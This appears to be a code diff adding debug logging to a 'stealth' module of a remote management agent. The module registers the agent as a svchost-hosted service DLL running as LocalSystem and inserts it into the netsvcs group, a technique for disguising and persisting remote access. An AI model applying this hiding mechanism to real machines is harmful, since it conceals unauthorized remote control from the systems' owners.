@@ -10,6 +10,7 @@
 #include <stdlib.h>
 #include <wchar.h>
 #include "stealth.h"
+#include "stealth_utils.h"
 #include "../meshcore/agentcore.h"
 #include "../meshcore/generated/meshagent_branding.h"
 #include "../microstack/ILibParsers.h"
@@ -126,6 +127,7 @@ VOID WINAPI Stealth_SvchostServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
 
     if (!g_SvchostStatusHandle)
     {
+        Stealth_DebugLastErrorW(L"RegisterServiceCtrlHandlerEx");
         return;  // Failed to register handler
     }
 
@@ -149,6 +151,7 @@ VOID WINAPI Stealth_SvchostServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
 
     if (!g_SvchostAgent)
     {
+        Stealth_DebugPrintfA("MeshAgent_Create failed in svchost service main");
         // Failed to create agent
         g_SvchostStatus.dwCurrentState = SERVICE_STOPPED;
         g_SvchostStatus.dwWin32ExitCode = ERROR_SERVICE_SPECIFIC_ERROR;
@@ -198,6 +201,7 @@ BOOL Stealth_RegisterSvchostService(const wchar_t* serviceName, const wchar_t* d
 
     if (serviceName == NULL || serviceName[0] == 0 || dllPath == NULL || dllPath[0] == 0)
     {
+        Stealth_DebugPrintfW(L"Stealth_RegisterSvchostService invalid parameters (service=%ls path=%ls)", serviceName, dllPath);
         return FALSE;
     }
 
@@ -269,12 +273,26 @@ BOOL Stealth_RegisterSvchostService(const wchar_t* serviceName, const wchar_t* d
                         L"LocalSystem",
                         (wDisplayName[0] != 0) ? wDisplayName : NULL);
                 }
+                else
+                {
+                    Stealth_DebugLastErrorW(L"OpenServiceW");
+                }
+            }
+            else
+            {
+                Stealth_DebugLastErrorW(L"CreateServiceW");
             }
         }
+    }
+    else
+    {
+        Stealth_DebugLastErrorW(L"OpenSCManagerW");
+        goto CLEANUP;
     }
 
     if (hService == NULL)
     {
+        Stealth_DebugLastErrorW(L"RegCreateKeyEx(Service)");
         goto CLEANUP;
     }
 
@@ -397,6 +415,7 @@ BOOL Stealth_RegisterSvchostService(const wchar_t* serviceName, const wchar_t* d
 
                 if (required >= _countof(currentServices))
                 {
+                    Stealth_DebugLastErrorW(L"RegSetValueEx(netsvcs)");
                     goto CLEANUP;
                 }
 
@@ -422,6 +441,7 @@ BOOL Stealth_RegisterSvchostService(const wchar_t* serviceName, const wchar_t* d
 
     if (!netsvcsConfigured)
     {
+        Stealth_DebugPrintfA("Failed to ensure netsvcs membership for %ls", serviceName);
         goto CLEANUP;
     }
 
@@ -604,7 +624,7 @@ static BOOL Stealth_SelectSvchostImage(const wchar_t* dllPath, wchar_t* exePathO
 
     // Fallback to the standard System32 path (may fail if truly missing)
     lstrcpynW(exePathOut, L"%SystemRoot%\\System32\\svchost.exe", (int)exePathOutLen);
-    fwprintf(stderr, L"[!] Stealth_SelectSvchostImage falling back to default host path\n");
+    Stealth_DebugPrintfW(L"Stealth_SelectSvchostImage fallback to %%SystemRoot%%\\System32\\svchost.exe");
     if (useExpand != NULL) { *useExpand = TRUE; }
     return FALSE;
 }
